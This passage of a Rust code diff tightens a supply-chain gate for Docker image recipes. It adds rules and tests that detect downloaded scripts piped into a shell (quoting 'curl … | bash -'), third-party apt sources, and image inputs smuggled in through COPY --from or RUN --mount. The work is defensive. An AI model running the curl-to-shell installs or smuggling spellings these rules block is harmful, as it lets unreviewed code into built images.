@@ -2425,72 +2425,27 @@ struct ParentSpec {
 struct ParentInventory {
     pins: BTreeMap<String, Pin>,
     recipes: BTreeMap<String, Vec<ParentSpec>>,
-    apt_open_gaps: Vec<AptOpenGap>,
 }
 
-/// One reviewed legacy apt source or key installation (#96). The record is the
-/// complete physical instruction, so an edited, extended or moved instruction
-/// stops being covered: an exemption is never a URL marker or a substring.
-#[derive(Clone, Debug, PartialEq, Eq)]
-struct AptOpenGap {
-    recipe: String,
-    instruction: String,
-    owner: String,
-}
-
-const APT_GAP_OWNER: &str = "https://github.com/gregwebs/agent-vm-images/issues/96";
-
-fn parse_apt_open_gaps(
-    value: &Value,
-    recipes: &BTreeMap<String, Vec<ParentSpec>>,
-) -> Result<Vec<AptOpenGap>, String> {
-    let mut gaps: Vec<AptOpenGap> = Vec::new();
-    for item in array(value, "apt_open_gaps")? {
-        let members = exact(
-            item,
-            &["recipe", "instruction", "owner"],
-            "apt_open_gaps entry",
-        )?;
-        let recipe = text(&members["recipe"], "apt_open_gaps entry")?;
-        if !recipes.contains_key(&recipe) {
-            return Err(format!("apt gap recipe is not a recorded recipe: {recipe}"));
-        }
-        let owner = text(&members["owner"], "apt_open_gaps entry")?;
-        if owner != APT_GAP_OWNER {
-            return Err(format!(
-                "apt gap in {recipe}: owner must be {APT_GAP_OWNER}"
-            ));
-        }
-        let instruction = text(&members["instruction"], "apt_open_gaps entry")?;
-        let lines: Vec<&str> = instruction.split('\n').collect();
-        let complete = instruction.starts_with("RUN ")
-            && !instruction.contains('\r')
-            && !instruction.ends_with('\n')
-            && lines.iter().all(|line| !line.trim().is_empty())
-            && lines[..lines.len() - 1]
-                .iter()
-                .all(|line| line.trim_end().ends_with('\\'))
-            && !lines[lines.len() - 1].trim_end().ends_with('\\');
-        if !complete {
-            return Err(format!(
-                "apt gap in {recipe}: an exact RUN instruction is required"
-            ));
-        }
-        if gaps
-            .iter()
-            .any(|gap| gap.recipe == recipe && gap.instruction == instruction)
-        {
-            return Err(format!(
-                "apt gap in {recipe}: duplicate recorded instruction"
-            ));
-        }
-        gaps.push(AptOpenGap {
-            recipe,
-            instruction,
-            owner,
-        });
+/// `apt_open_gaps` is the closed record of the two #96 instructions. The key
+/// stays in the schema as an empty list because a recorded exception can only
+/// describe a third-party apt source, and no maintained recipe may add one any
+/// more: an entry is refused outright rather than compared against a recipe, so
+/// there is nothing left for a recipe edit to keep alive.
+fn require_no_apt_open_gaps(value: &Value) -> Result<(), String> {
+    let entries = array(value, "apt_open_gaps")?;
+    if let Some(entry) = entries.first() {
+        let recipe = entry
+            .as_object()
+            .and_then(|members| members.get("recipe"))
+            .and_then(Value::as_str)
+            .unwrap_or("an unnamed recipe");
+        return Err(format!(
+            "apt_open_gaps is closed: #96 removed the recorded third-party instructions, so \
+             {recipe} cannot hold one"
+        ));
     }
-    Ok(gaps)
+    Ok(())
 }
 
 fn parse_recipes(value: &Value) -> Result<BTreeMap<String, Vec<ParentSpec>>, String> {
@@ -2567,11 +2522,8 @@ fn parse_parent_inventory(text_source: &str) -> Result<ParentInventory, String> 
         pins.insert(name.to_owned(), parsed);
     }
     let recipes = parse_recipes(&members["recipes"])?;
-    Ok(ParentInventory {
-        pins,
-        apt_open_gaps: parse_apt_open_gaps(&members["apt_open_gaps"], &recipes)?,
-        recipes,
-    })
+    require_no_apt_open_gaps(&members["apt_open_gaps"])?;
+    Ok(ParentInventory { pins, recipes })
 }
 
 #[derive(Clone, Debug, PartialEq, Eq)]
@@ -2842,7 +2794,7 @@ const APT_INSECURE_MARKERS: [&str; 9] = [
 /// and the deb822 fields (`Signed-By`, `Types: deb`, `URIs:`) read like the
 /// one-line `signed-by=` option once folded. A construction that spells none of
 /// these tokens is still a review question.
-const APT_SOURCE_MARKERS: [&str; 15] = [
+const APT_SOURCE_MARKERS: [&str; 18] = [
     "/etc/apt",
     "/etc/apt/keyrings",
     "/usr/share/keyrings",
@@ -2858,7 +2810,14 @@ const APT_SOURCE_MARKERS: [&str; 15] = [
     "debsrc",
     "deb[",
     "nodesource",
+    "setup22.x",
+    "cli.github.com",
+    "githubcli",
 ];
+
+/// The exact wording every "no apt source" refusal carries, so the tests assert
+/// one reason rather than a sentence they would otherwise have to keep in step.
+const APT_SOURCE_REFUSAL: &str = "apt source or key installation is not accepted";
 
 /// Case, separators and whitespace are spelling, not meaning: `Signed-By`,
 /// `Signed_By` and `Signed By` all name the same apt field, and a marker that
@@ -2886,16 +2845,16 @@ fn apt_source_marker(text: &str) -> Option<&'static str> {
     marker_in(&APT_SOURCE_MARKERS, text)
 }
 
-/// A static ratchet, not a sandbox: the two reviewed #96 instructions may write
-/// apt state, and any other instruction or shell line that does is a new source
-/// that needs review. The parent-baseline checker owns the state the pinned
-/// Debian parent ships; this gate owns what the recipes add on top of it.
+/// A static ratchet, not a sandbox: no maintained instruction or shell line may
+/// write apt source or key state. Both exceptions were removed with their
+/// installers (#96), so there is no reviewed position left to hold. The
+/// parent-baseline checker owns the state the pinned Debian parent ships; this
+/// gate owns what the recipes add on top of it.
 ///
 /// Markers are matched against the whole instruction, so a RUN's shell text and a
 /// COPY/ADD destination are both covered: `COPY apt /etc/apt` writes the source
 /// directory without naming a shell command.
 fn check_apt_sources(
-    inventory: &ParentInventory,
     recipes: &BTreeMap<String, String>,
     shell_sources: &BTreeMap<String, String>,
 ) -> Result<(), String> {
@@ -2908,37 +2867,11 @@ fn check_apt_sources(
             }
         }
     }
-    let mut recorded: BTreeMap<&str, Vec<&str>> = BTreeMap::new();
-    for gap in &inventory.apt_open_gaps {
-        let source = recipes
-            .get(&gap.recipe)
-            .ok_or_else(|| format!("apt gap recipe is not a maintained recipe: {}", gap.recipe))?;
-        let matches = physical_instructions(source)
-            .iter()
-            .filter(|instruction| **instruction == gap.instruction)
-            .count();
-        if matches != 1 {
-            return Err(format!(
-                "apt gap changed/closed: review or remove exact instruction entry for {} (owner #96)",
-                gap.recipe
-            ));
-        }
-        recorded
-            .entry(&gap.recipe)
-            .or_default()
-            .push(&gap.instruction);
-    }
     for (path, source) in recipes {
         for instruction in physical_instructions(source) {
-            let Some(marker) = apt_source_marker(&instruction) else {
-                continue;
-            };
-            let recorded_here = recorded
-                .get(path.as_str())
-                .is_some_and(|gaps| gaps.iter().any(|gap| **gap == instruction));
-            if !recorded_here {
+            if let Some(marker) = apt_source_marker(&instruction) {
                 return Err(format!(
-                    "{path}: apt source or key installation is not a recorded exact instruction (owner #96): {marker}"
+                    "{path}: {APT_SOURCE_REFUSAL} (owner #96): {marker}"
                 ));
             }
         }
@@ -2956,7 +2889,7 @@ fn check_apt_sources(
             }
             if let Some(marker) = apt_source_marker(code) {
                 return Err(format!(
-                    "{path}: apt source or key installation is not a recorded exact instruction (owner #96): {marker}"
+                    "{path}: {APT_SOURCE_REFUSAL} (owner #96): {marker}"
                 ));
             }
         }
@@ -2964,13 +2897,935 @@ fn check_apt_sources(
     Ok(())
 }
 
-/// Every maintained shell source, minus verbatim upstream provenance snapshots
-/// and the baseline checker itself, which necessarily names apt paths and flags.
-fn maintained_shell_sources() -> BTreeMap<String, String> {
-    let mut sources = repository_files("images", None, Some("sh"));
-    sources.extend(repository_files("examples", None, Some("sh")));
+/// A maintained recipe must not run a script it just downloaded. The removed
+/// NodeSource instruction did exactly that (`curl …/setup_22.x | bash -`); its
+/// replacement is an archive whose bytes are hashed against a committed pin. The
+/// pipe is matched on shell words, not on a substring, so `curl … | sha256sum -c`
+/// stays legal while `| bash`, `| sh`, `| /bin/sh`, `| sudo bash` and `| dash`
+/// are refused. Like the apt ratchet this is a static catch for known spellings,
+/// not a shell parser: an interpreter reached through `xargs` or a variable is
+/// still a review question.
+const SHELL_PROGRAMS: [&str; 3] = ["bash", "sh", "dash"];
+
+/// The program a pipeline segment would run, skipping the wrappers and
+/// assignments that do not change which program is executed: `sudo -E bash`,
+/// `env FOO=1 sh`, `exec dash`. Matching only the first word let `| env sh`
+/// through.
+fn shell_program(segment: &str) -> Option<String> {
+    for word in shell_words(segment) {
+        // A pipeline embedded in a quoted program text (`os.system("curl … | sh")`)
+        // leaves the closing quote attached, so the name is the leading identifier.
+        let bare = word.text.rsplit('/').next().unwrap_or(&word.text);
+        let name: String = bare
+            .chars()
+            .take_while(|character| {
+                character.is_ascii_alphanumeric() || matches!(character, '_' | '.' | '-')
+            })
+            .collect();
+        if name.is_empty() || name.starts_with('-') {
+            continue;
+        }
+        if matches!(
+            name.as_str(),
+            "sudo" | "env" | "exec" | "command" | "nohup" | "nice"
+        ) {
+            continue;
+        }
+        return Some(name);
+    }
+    None
+}
+
+fn pipes_into_shell(instruction: &str) -> bool {
+    let joined = instruction.replace('\n', " ");
+    if !(joined.contains("curl") || joined.contains("wget")) {
+        return false;
+    }
+    joined.split('|').skip(1).any(|segment| {
+        shell_program(segment).is_some_and(|name| SHELL_PROGRAMS.contains(&name.as_str()))
+    })
+}
+
+/// One instruction as simple commands: line continuations joined, comments
+/// dropped, quoting honoured, splits at the shell separators. The apt and pipe
+/// rules need words, not substrings - `apt-get -y install nodejs` and a
+/// continuation before `install` both defeat a literal `"apt-get install"`.
+fn instruction_commands(instruction: &str) -> Vec<Vec<String>> {
+    let joined = instruction.replace("\\\n", " ").replace('\\', " ");
+    let mut commands = Vec::new();
+    for line in joined.split('\n') {
+        for command in split_commands(strip_comment(line)) {
+            let mut words: Vec<String> = shell_words(&command)
+                .into_iter()
+                .map(|word| word.text)
+                .filter(|word| !word.is_empty())
+                .collect();
+            // The Dockerfile instruction keyword is not a command word.
+            if words.first().is_some_and(|word| {
+                matches!(
+                    word.as_str(),
+                    "RUN" | "COPY" | "ADD" | "ENV" | "LABEL" | "CMD" | "ENTRYPOINT" | "SHELL"
+                )
+            }) {
+                words.remove(0);
+            }
+            if !words.is_empty() {
+                commands.push(words);
+            }
+        }
+    }
+    commands
+}
+
+fn check_no_piped_remote_script(
+    recipes: &BTreeMap<String, String>,
+    helpers: &BTreeMap<String, String>,
+) -> Result<(), String> {
+    for (path, source) in recipes.iter().chain(helpers) {
+        for instruction in physical_instructions(source) {
+            if pipes_into_shell(&instruction) {
+                return Err(format!(
+                    "{path}: a downloaded script may not be executed through a pipe (#96); \
+                     pin the artifact instead"
+                ));
+            }
+        }
+    }
+    Ok(())
+}
+
+/// The package names apt must never be asked for. `node`, `nodejs`, `npm` and
+/// `npx` are Node's and `gh` is the GitHub CLI's; all of them arrived through a
+/// floating third-party source until #96 replaced them with the pins.
+const ARTIFACT_PACKAGES: [&str; 5] = ["node", "nodejs", "npm", "npx", "gh"];
+
+const APT_PROGRAMS: [&str; 3] = ["apt-get", "apt", "aptitude"];
+const APT_INSTALL_VERBS: [&str; 2] = ["install", "reinstall"];
+/// Options that take the *next* word as their value, so it is not the verb.
+const APT_VALUE_OPTIONS: [&str; 5] = ["-o", "-c", "-t", "--option", "--config-file"];
+
+/// The package a word asks for, whichever way apt spells it: `nodejs:amd64`,
+/// `nodejs=22.0.0`, `'nodejs*'`, `nodejs+`, `"gh"`. Quoting is already removed
+/// by the tokeniser; the qualifiers and globs are stripped here.
+fn protected_package(word: &str) -> Option<String> {
+    let mut name = word.trim_matches(|character| character == '\'' || character == '"');
+    if let Some((before, _)) = name.split_once('=') {
+        name = before;
+    }
+    if let Some((before, _)) = name.split_once(':') {
+        name = before;
+    }
+    let name = name.trim_end_matches(['*', '?', '+', '-', '.']);
+    if ARTIFACT_PACKAGES.contains(&name) {
+        return Some(name.to_owned());
+    }
+    None
+}
+
+fn apt_package_offence(instruction: &str) -> Option<String> {
+    for words in instruction_commands(instruction) {
+        let mut index = 0;
+        // Wrappers and assignments before the program: `sudo apt-get`, `env X=1 apt-get`.
+        while let Some(word) = words.get(index) {
+            let name = word.rsplit('/').next().unwrap_or(word);
+            if matches!(name, "sudo" | "env" | "exec" | "command" | "nohup")
+                || (word.contains('=') && !word.starts_with('-'))
+            {
+                index += 1;
+                continue;
+            }
+            break;
+        }
+        let Some(program) = words
+            .get(index)
+            .map(|word| word.rsplit('/').next().unwrap_or(word).to_owned())
+        else {
+            continue;
+        };
+        if !APT_PROGRAMS.contains(&program.as_str()) {
+            continue;
+        }
+        index += 1;
+        // Options may precede the verb.
+        while let Some(word) = words.get(index) {
+            if !word.starts_with('-') {
+                break;
+            }
+            index += if APT_VALUE_OPTIONS.contains(&word.as_str()) {
+                2
+            } else {
+                1
+            };
+        }
+        let Some(verb) = words.get(index) else {
+            continue;
+        };
+        if !APT_INSTALL_VERBS.contains(&verb.as_str()) {
+            continue;
+        }
+        for word in &words[index + 1..] {
+            if word.starts_with('-') {
+                continue;
+            }
+            if let Some(package) = protected_package(word) {
+                return Some(package);
+            }
+        }
+    }
+    None
+}
+
+fn check_no_apt_artifact_package(
+    recipes: &BTreeMap<String, String>,
+    helpers: &BTreeMap<String, String>,
+) -> Result<(), String> {
+    for (path, source) in recipes.iter().chain(helpers) {
+        for instruction in physical_instructions(source) {
+            if let Some(package) = apt_package_offence(&instruction) {
+                return Err(format!(
+                    "{path}: apt may not install {package}: Node and the GitHub CLI come \
+                     from images/artifacts (#96)"
+                ));
+            }
+        }
+    }
+    Ok(())
+}
+
+/// A maintained recipe may not download an archive and unpack it by hand: that is
+/// the installation surface `images/install-artifact.sh` exists to own, with a
+/// committed digest checked before extraction. A hand-rolled
+/// `curl ... -o x && tar -xf x` (or an `ADD`ed tarball) has no such review.
+const EXTRACT_COMMANDS: [&str; 5] = ["tar", "unzip", "gunzip", "zcat", "bsdtar"];
+
+fn downloads_an_archive(instruction: &str) -> bool {
+    let upper = instruction.to_ascii_uppercase();
+    if upper.starts_with("ADD ")
+        && (instruction.contains("http://") || instruction.contains("https://"))
+    {
+        return true;
+    }
+    if !(instruction.contains("curl") || instruction.contains("wget")) {
+        return false;
+    }
+    [".tar.gz", ".tar.xz", ".tgz", ".zip", ".tar"]
+        .iter()
+        .any(|suffix| instruction.contains(suffix))
+}
+
+fn extracts_an_archive(instruction: &str) -> bool {
+    instruction_commands(instruction).iter().any(|words| {
+        words.iter().any(|word| {
+            let name = word.rsplit('/').next().unwrap_or(word);
+            EXTRACT_COMMANDS.contains(&name)
+                && words
+                    .iter()
+                    .any(|flag| flag.starts_with('-') && flag.contains('x'))
+        })
+    })
+}
+
+fn check_no_manual_archive_install(recipes: &BTreeMap<String, String>) -> Result<(), String> {
+    for (path, source) in recipes {
+        for instruction in physical_instructions(source) {
+            if downloads_an_archive(&instruction) && extracts_an_archive(&instruction) {
+                return Err(format!(
+                    "{path}: a downloaded archive may not be unpacked by hand (#96); \
+                     install it through images/install-artifact.sh with a committed pin"
+                ));
+            }
+        }
+    }
+    Ok(())
+}
+
+/// Every #96 recipe rule in one place: no apt source or key material, no
+/// downloaded script on a pipe, and no Node or gh package through apt.
+fn check_legacy_install_paths(
+    recipes: &BTreeMap<String, String>,
+    helpers: &BTreeMap<String, String>,
+) -> Result<(), String> {
+    check_apt_sources(recipes, helpers)?;
+    check_no_piped_remote_script(recipes, helpers)?;
+    check_no_apt_artifact_package(recipes, helpers)?;
+    check_no_manual_archive_install(recipes)
+}
+
+#[test]
+fn external_image_inputs_resolve_through_the_inventory() {
+    let inventory = parse_parent_inventory(&read_text(PARENT_INVENTORY)).unwrap();
+    let recipes = maintained_recipes();
+    check_image_inputs(&recipes, &inventory).unwrap();
+    let base = recipes["images/Dockerfile"].clone();
+    let standard = recipes["images/standard/Dockerfile"].clone();
+    let parent = inventory.pins[DEBIAN_PIN].reference().text();
+
+    // The two spellings a reviewer used to smuggle a floating Node in, plus a
+    // digest that is not a reviewed parent.
+    let mutations: Vec<(&str, BTreeMap<String, String>, &str)> = vec![
+        (
+            "an external COPY --from",
+            edited_recipe(
+                &recipes,
+                "images/Dockerfile",
+                &base,
+                &format!("{base}COPY --from=node:22 /usr/local/ /usr/local/\n"),
+            ),
+            "--from=node:22",
+        ),
+        (
+            "an external RUN --mount=from",
+            edited_recipe(
+                &recipes,
+                "images/standard/Dockerfile",
+                &standard,
+                &format!(
+                    "{standard}RUN --mount=from=node:22,source=/usr/local,target=/mnt/node \\\n    cp -a /mnt/node/. /usr/local/\n"
+                ),
+            ),
+            "--from=node:22",
+        ),
+        (
+            "a quote-wrapped RUN --mount=from",
+            edited_recipe(
+                &recipes,
+                "images/standard/Dockerfile",
+                &standard,
+                &format!(
+                    "{standard}RUN --mount='from=node:22,source=/usr/local,target=/mnt/node' \\\n    cp -a /mnt/node/. /usr/local/\n"
+                ),
+            ),
+            "--from=node:22",
+        ),
+        (
+            "a double-quoted RUN --mount=from",
+            edited_recipe(
+                &recipes,
+                "images/standard/Dockerfile",
+                &standard,
+                &format!(
+                    "{standard}RUN --mount=\"from=node:22,target=/mnt/node\" cp -a /mnt/node/. /usr/local/\n"
+                ),
+            ),
+            "--from=node:22",
+        ),
+        (
+            "a type=image mount source",
+            edited_recipe(
+                &recipes,
+                "images/standard/Dockerfile",
+                &standard,
+                &format!(
+                    "{standard}RUN --mount=type=image,source=node:22,target=/mnt/node cp -a /mnt/node/. /usr/local/\n"
+                ),
+            ),
+            "node:22",
+        ),
+        (
+            "an unpinned external image",
+            edited_recipe(
+                &recipes,
+                "images/Dockerfile",
+                &base,
+                &format!("{base}COPY --from=debian:13-slim /usr/local/ /usr/local/\n"),
+            ),
+            "--from=debian:13-slim",
+        ),
+        (
+            "a digest that is not in the inventory",
+            edited_recipe(
+                &recipes,
+                "images/Dockerfile",
+                &base,
+                &format!(
+                    "{base}COPY --from=debian:13-slim@sha256:{} /usr/local/ /usr/local/\n",
+                    "0".repeat(64)
+                ),
+            ),
+            "not in",
+        ),
+    ];
+    for (label, edited, needle) in mutations {
+        let error = check_image_inputs(&edited, &inventory)
+            .expect_err(&format!("accepted an unresolved image input: {label}"));
+        assert!(error.contains(needle), "{label}: {error}");
+        assert!(
+            error.contains("#96") || error.contains("not in"),
+            "{label}: {error}"
+        );
+    }
+    // A declared stage, a stage index and a reviewed parent digest all stay legal.
+    for allowed in [
+        format!("{base}COPY --from=recipe-contract-bin /out/recipe-contract /tmp/x\n"),
+        format!("{base}COPY --from=0 /out/recipe-contract /tmp/x\n"),
+        format!("{base}COPY --from={parent} /usr/local/ /tmp/x\n"),
+    ] {
+        let mut edited = recipes.clone();
+        edited.insert("images/Dockerfile".to_owned(), allowed);
+        check_image_inputs(&edited, &inventory).unwrap();
+    }
+}
+
+#[test]
+fn the_base_recipe_brackets_package_steps_with_the_apt_baseline() {
+    let recipes = maintained_recipes();
+    let base = recipes["images/Dockerfile"].clone();
+    check_apt_baseline_brackets_build(&base).unwrap();
+    assert_eq!(
+        base.matches("apt-policy/check-sources.sh").count(),
+        2,
+        "the base recipe checks the apt sources twice"
+    );
+    let baseline = "RUN --mount=type=bind,source=apt-policy,target=/tmp/apt-policy,ro \\\n    bash /tmp/apt-policy/check-sources.sh --policy /tmp/apt-policy\n";
+    let mutations: Vec<(&str, String)> = vec![
+        ("the baseline check deleted", base.replacen(baseline, "", 1)),
+        (
+            "the final check deleted",
+            base.replacen(baseline, "", 1).replacen(baseline, "", 1),
+        ),
+        (
+            // A package step after the final check: the built image's source set
+            // would no longer be the one that was checked.
+            "a package step after the final check",
+            base.replacen(
+                "\n# Nothing above proves which sources this base consumed",
+                "\nRUN apt-get update && apt-get install -y zsh\n\n# Nothing above proves \
+                 which sources this base consumed",
+                1,
+            ),
+        ),
+    ];
+    for (label, edited) in mutations {
+        assert_ne!(
+            edited, base,
+            "the apt baseline mutation did not apply: {label}"
+        );
+        let error = check_apt_baseline_brackets_build(&edited)
+            .expect_err(&format!("accepted an unbracketed build: {label}"));
+        assert!(
+            error.contains("check-sources.sh"),
+            "{label}: the refusal names the missing bracket: {error}"
+        );
+    }
+}
+
+// --- pinned third-party release artifacts (#96) -----------------------------
+//
+// `images/artifacts/<name>.json` is the reviewed selection of one third-party
+// release artifact and `images/install-artifact.sh` is the only thing that puts
+// one into the image. The gate re-derives the identity from the pin instead of
+// trusting the installer: both architectures, the canonical URL, the exact
+// filename the member prefix derives from, a lower-case digest, and an
+// authentication record of the expected kind. What it cannot re-derive is a
+// hash - no SHA-256 implementation lives in this crate - so the committed
+// evidence bytes are bound by `images/base-inputs.sha256` (which the host
+// generator and the build verify) and by the installer, not here.
+
+const ARTIFACT_PINS: [(&str, &str); 2] = [
+    ("node", "images/artifacts/node.json"),
+    ("gh", "images/artifacts/gh.json"),
+];
+/// The reviewed Node release key: one primary key from `nodejs/release-keys`,
+/// with the fingerprint the pin has to name.
+const NODE_RELEASE_KEY: &str = "node-release-key.asc";
+const NODE_RELEASE_FINGERPRINT: &str = "5BE8A3F6C8A5C01D106C0AD820B1A390B168D356";
+/// cli/cli's Sigstore identity, spelled the way the pin and the in-build
+/// verifier spell it.
+const GH_SIGSTORE_POLICY: [(&str, &str); 3] = [
+    ("repository", "cli/cli"),
+    (
+        "signer_workflow",
+        "cli/cli/.github/workflows/deployment.yml",
+    ),
+    (
+        "cert_oidc_issuer",
+        "https://token.actions.githubusercontent.com",
+    ),
+];
+const ARTIFACT_LABEL_PREFIX: &str = "org.agent-vm.version.";
+const ARTIFACT_INSTALLER: &str = "install-artifact.sh";
+const ARTIFACT_SOURCE_ROOT: &str = "/tmp/artifact-source";
+
+#[derive(Clone, Debug, PartialEq, Eq)]
+struct ArtifactArchive {
+    url: String,
+    archive: String,
+    member_prefix: String,
+    digest: String,
+    bundle: Option<(String, String)>,
+}
+
+#[derive(Clone, Debug, PartialEq, Eq)]
+enum ArtifactAuthentication {
+    OpenPgp {
+        key_path: String,
+        fingerprint: String,
+        key_digest: String,
+        manifest_digest: String,
+        signature_digest: String,
+        verified_on: String,
+    },
+    Sigstore {
+        checksums_digest: String,
+        policy: BTreeMap<String, String>,
+        verified_on: String,
+        evidence: Vec<String>,
+    },
+}
+
+#[derive(Clone, Debug, PartialEq, Eq)]
+struct ArtifactPin {
+    name: String,
+    version: String,
+    payload: Vec<String>,
+    links: Vec<(String, String)>,
+    /// The npm version the reviewed Node archive ships, recorded so the runtime
+    /// evidence compares against a reviewed value instead of whatever the image
+    /// reports (#96 review: an equal-but-wrong npm/npx pair passed).
+    bundled: Option<String>,
+    archives: BTreeMap<String, ArtifactArchive>,
+    authentication: ArtifactAuthentication,
+}
+
+fn platform_token(name: &str, platform: &str) -> &'static str {
+    match (name, platform) {
+        ("node", "linux/amd64") => "linux-x64",
+        ("node", "linux/arm64") => "linux-arm64",
+        ("gh", "linux/amd64") => "linux_amd64",
+        ("gh", "linux/arm64") => "linux_arm64",
+        _ => unreachable!("the pin names a supported artifact and platform"),
+    }
+}
+
+fn artifact_filename(name: &str, version: &str, platform: &str) -> String {
+    match name {
+        "node" => format!("node-v{version}-{}.tar.xz", platform_token(name, platform)),
+        _ => format!("gh_{version}_{}.tar.gz", platform_token(name, platform)),
+    }
+}
+
+fn artifact_bundle_name(version: &str, platform: &str) -> String {
+    format!("gh-{version}-{}.bundle.jsonl", platform.replace('/', "-"))
+}
+
+fn parse_artifact_authentication(
+    name: &str,
+    value: &Value,
+) -> Result<ArtifactAuthentication, String> {
+    if name == "node" {
+        let members = exact(
+            value,
+            &[
+                "method",
+                "manifest",
+                "signature",
+                "key",
+                "verified_on",
+                "reason",
+            ],
+            "node authentication",
+        )?;
+        if text(&members["method"], "node method")? != "openpgp-signed-manifest" {
+            return Err("node authentication must be an openpgp-signed-manifest".into());
+        }
+        let manifest = exact(&members["manifest"], &["url", "sha256"], "node manifest")?;
+        let signature = exact(&members["signature"], &["url", "sha256"], "node signature")?;
+        let key = exact(
+            &members["key"],
+            &["path", "fingerprint", "sha256"],
+            "node key",
+        )?;
+        let key_path = text(&key["path"], "node key path")?;
+        if key_path != NODE_RELEASE_KEY {
+            return Err(format!(
+                "node key path must be {NODE_RELEASE_KEY}, found {key_path}"
+            ));
+        }
+        let fingerprint = text(&key["fingerprint"], "node key fingerprint")?;
+        if fingerprint != NODE_RELEASE_FINGERPRINT {
+            return Err(format!(
+                "node key fingerprint must be the reviewed {NODE_RELEASE_FINGERPRINT}"
+            ));
+        }
+        let key_digest = text(&key["sha256"], "node key sha256")?;
+        if !is_lower_hex(&key_digest, 64) {
+            return Err("node key sha256 must be a lower-case SHA-256".into());
+        }
+        let manifest_digest = text(&manifest["sha256"], "node manifest sha256")?;
+        let signature_digest = text(&signature["sha256"], "node signature sha256")?;
+        for (label, digest) in [
+            ("manifest", &manifest_digest),
+            ("signature", &signature_digest),
+        ] {
+            if !is_lower_hex(digest, 64) {
+                return Err(format!("node {label} sha256 must be a lower-case SHA-256"));
+            }
+        }
+        for (label, url) in [
+            ("manifest", text(&manifest["url"], "node manifest url")?),
+            ("signature", text(&signature["url"], "node signature url")?),
+        ] {
+            if !url.starts_with("https://nodejs.org/dist/") {
+                return Err(format!(
+                    "node {label} url must be the nodejs.org dist origin"
+                ));
+            }
+        }
+        let verified_on = text(&members["verified_on"], "node verified_on")?;
+        if !is_date(&verified_on) {
+            return Err("node verified_on must be a date".into());
+        }
+        let _ = text(&members["reason"], "node reason")?;
+        return Ok(ArtifactAuthentication::OpenPgp {
+            key_path,
+            fingerprint,
+            key_digest,
+            manifest_digest,
+            signature_digest,
+            verified_on,
+        });
+    }
+    let members = exact(
+        value,
+        &[
+            "method",
+            "checksums",
+            "policy",
+            "verified_on",
+            "reason",
+            "evidence",
+        ],
+        "gh authentication",
+    )?;
+    if text(&members["method"], "gh method")? != "sigstore-attestation" {
+        return Err("gh authentication must be a sigstore-attestation".into());
+    }
+    let checksums = exact(&members["checksums"], &["url", "sha256"], "gh checksums")?;
+    let checksums_digest = text(&checksums["sha256"], "gh checksums sha256")?;
+    if !is_lower_hex(&checksums_digest, 64) {
+        return Err("gh checksums sha256 must be a lower-case SHA-256".into());
+    }
+    if !text(&checksums["url"], "gh checksums url")?
+        .starts_with("https://github.com/cli/cli/releases/download/")
+    {
+        return Err("gh checksums url must be the cli/cli release download".into());
+    }
+    let policy_members = exact(
+        &members["policy"],
+        &[
+            "repository",
+            "signer_workflow",
+            "cert_oidc_issuer",
+            "deny_self_hosted_runners",
+        ],
+        "gh policy",
+    )?;
+    let mut policy = BTreeMap::new();
+    for (key, expected) in GH_SIGSTORE_POLICY {
+        let found = text(&policy_members[key], &format!("gh policy {key}"))?;
+        if found != expected {
+            return Err(format!("gh policy {key} must be {expected}, found {found}"));
+        }
+        policy.insert(key.to_owned(), found);
+    }
+    policy.insert(
+        "deny_self_hosted_runners".to_owned(),
+        policy_members["deny_self_hosted_runners"].to_string(),
+    );
+    if policy_members["deny_self_hosted_runners"] != Value::Bool(true) {
+        return Err("gh policy must deny self-hosted runners".into());
+    }
+    let verified_on = text(&members["verified_on"], "gh verified_on")?;
+    if !is_date(&verified_on) {
+        return Err("gh verified_on must be a date".into());
+    }
+    let _ = text(&members["reason"], "gh reason")?;
+    let mut evidence = Vec::new();
+    for item in array(&members["evidence"], "gh evidence")? {
+        let url = text(item, "gh evidence url")?;
+        if !url.starts_with("https://") {
+            return Err("gh evidence entries must be https URLs".into());
+        }
+        evidence.push(url);
+    }
+    if evidence.is_empty() {
+        return Err("gh authentication must cite evidence".into());
+    }
+    Ok(ArtifactAuthentication::Sigstore {
+        checksums_digest,
+        policy,
+        verified_on,
+        evidence,
+    })
+}
+
+fn parse_artifact_pin(name: &str, source: &str) -> Result<ArtifactPin, String> {
+    let value = strict_json(source)?;
+    let mut keys = vec![
+        "schema",
+        "name",
+        "kind",
+        "version",
+        "upstream",
+        "install",
+        "platforms",
+    ];
+    if name == "node" {
+        keys.push("bundled");
+    }
+    keys.push("authentication");
+    let members = exact(&value, &keys, "artifact pin")?;
+    if members["schema"].as_u64() != Some(1) {
+        return Err("unsupported artifact pin schema".into());
+    }
+    if text(&members["name"], "artifact name")? != name {
+        return Err(format!("the pin must name the artifact {name}"));
+    }
+    if text(&members["kind"], "artifact kind")? != "release-archive" {
+        return Err("artifact kind must be release-archive".into());
+    }
+    let version = text(&members["version"], "artifact version")?;
+    if !is_exact_version(&version) {
+        return Err(format!(
+            "artifact version must be an exact X.Y.Z: {version}"
+        ));
+    }
+    let upstream = exact(
+        &members["upstream"],
+        &["project", "release"],
+        "artifact upstream",
+    )?;
+    let _ = text(&upstream["project"], "artifact upstream project")?;
+    if text(&upstream["release"], "artifact upstream release")? != format!("v{version}") {
+        return Err("artifact upstream release must be v<version>".into());
+    }
+    let bundled = if name == "node" {
+        let node = exact(&members["bundled"], &["npm"], "node bundled")?;
+        let npm = text(&node["npm"], "node bundled npm")?;
+        if !is_exact_version(&npm) {
+            return Err(format!("node bundled npm must be an exact X.Y.Z: {npm}"));
+        }
+        Some(npm)
+    } else {
+        None
+    };
+    let install = exact(
+        &members["install"],
+        &["destination", "payload", "links"],
+        "artifact install",
+    )?;
+    if text(&install["destination"], "artifact destination")? != "/usr/local" {
+        return Err("artifact destination must be /usr/local".into());
+    }
+    let payload_entries = array(&install["payload"], "artifact payload")?;
+    if payload_entries.is_empty() {
+        return Err("artifact payload must be non-empty".into());
+    }
+    let mut payload = Vec::new();
+    for item in payload_entries {
+        let entry = text(item, "artifact payload entry")?;
+        if entry.starts_with('/') || entry.split('/').any(|part| part.is_empty() || part == "..") {
+            return Err(format!("artifact payload entry must be relative: {entry}"));
+        }
+        payload.push(entry);
+    }
+    let mut links = Vec::new();
+    for item in array(&install["links"], "artifact links")? {
+        let link = exact(item, &["path", "target"], "artifact link")?;
+        let mut pair = Vec::new();
+        for key in ["path", "target"] {
+            let path = text(&link[key], "artifact link path")?;
+            if !path.starts_with('/') || path.split('/').any(|part| part == "..") {
+                return Err(format!("artifact link {key} must be absolute: {path}"));
+            }
+            pair.push(path);
+        }
+        links.push((pair.remove(0), pair.remove(0)));
+    }
